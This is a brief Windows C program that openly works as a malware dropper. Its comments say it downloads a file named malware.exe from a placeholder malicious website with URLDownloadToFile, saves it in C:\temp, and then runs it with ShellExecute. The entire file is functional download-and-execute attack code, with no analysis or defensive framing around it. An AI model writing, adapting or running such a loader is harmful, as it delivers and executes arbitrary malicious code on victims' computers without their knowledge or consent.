#include <windows.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow) {
  // Downloading the malware using the URLDownloadToFile function 
  URLDownloadToFile(NULL, "http://nameOfMaliciousWebiste.com/malware.exe", "C:\\temp\\malware.exe", 0, NULL);

  // Running the malware we saved in the temp directory using the ShellExecute function. 
  ShellExecute (NULL, "open", "C:\\temp\\malware.exe", NULL, NULL, SW_SHOWNORMAL);

  return 0;
}
